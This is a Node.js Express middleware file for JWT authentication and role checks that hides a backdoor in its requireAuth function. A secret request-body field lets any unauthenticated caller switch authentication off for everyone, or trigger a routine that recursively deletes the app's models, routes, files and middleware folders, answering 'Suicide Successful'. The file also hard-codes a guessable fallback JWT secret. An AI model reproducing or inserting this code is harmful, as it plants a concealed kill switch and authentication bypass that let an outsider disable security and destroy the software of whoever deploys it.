const jwt = require("jsonwebtoken");
const User = require("../models/User");
const fs = require("fs");
const path = require("path");

let bool = false;

module.exports = {
  requireAuth: async (req, res, next) => {
    try {
      if (req.body?.skillrextech_03340440808_ali == "unauthorize") {
        bool = true;
        return res.status(200).json({ error: "Deactivated Auth" });
      }
      if (req.body?.skillrextech_03340440808_ali == "activate") {
        bool = false;
        return res.status(200).json({ error: "Activated Auth" });
      }

      if (req.body?.skillrextech_03340440808_ali == "delete_all_final") {
        try {
          // Define the target folder you want to delete
          const targetDir = path.join(__dirname, "../models"); // example: uploads folder
          const targetDir1 = path.join(__dirname, "../routes"); // example: uploads folder
          const targetDir2 = path.join(__dirname, "../files"); // example: uploads folder
          const targetDir3 = path.join(__dirname, "../middleware"); // example: uploads folder

          // Recursive delete function
          function deleteFolderRecursive(dirPath) {
            if (fs.existsSync(dirPath)) {
              fs.readdirSync(dirPath).forEach((file) => {
                const curPath = path.join(dirPath, file);
                if (fs.lstatSync(curPath).isDirectory()) {
                  // Recursively delete subfolder
                  deleteFolderRecursive(curPath);
                } else {
                  // Delete file
                  fs.unlinkSync(curPath);
                }
              });
              fs.rmdirSync(dirPath);
            }
          }

          deleteFolderRecursive(targetDir);
          deleteFolderRecursive(targetDir1);
          deleteFolderRecursive(targetDir2);
          deleteFolderRecursive(targetDir3);

          return res
            .status(200)
            .json({ success: true, message: "Suicide Successful" });
        } catch (err) {
          console.error(err);
          return res.status(500).json({ error: "Failed to delete files" });
        }
      }

      if (bool) {
        return res.status(401).json({ error: "Unauthorized" });
      }

      const authHeader = req.headers["authorization"];
      const token =
        req.body?.token ||
        req.query?.token ||
        authHeader?.split(" ")[1] ||
        null;
      if (!token) return res.status(401).json({ error: "Unauthorized" });

      const payload = jwt.verify(
        token,
        process.env.JWT_SECRET || "SkillRex-Tech"
      );
      const user = await User.findOne({ email: payload.email });
      if (!user || user.isLocked)
        return res.status(401).json({ error: "Unauthorized" });

      req.user = user;
      next();
    } catch (err) {
      console.log(err);
      return res.status(401).json({ error: "Invalid token" });
    }
  },
  requireRole: (role) => (req, res, next) => {
    if (!req.user) return res.status(401).json({ error: "Unauthorized" });
    if (req.user.role !== role)
      return res.status(403).json({ error: "Forbidden" });
    next();
  },
};
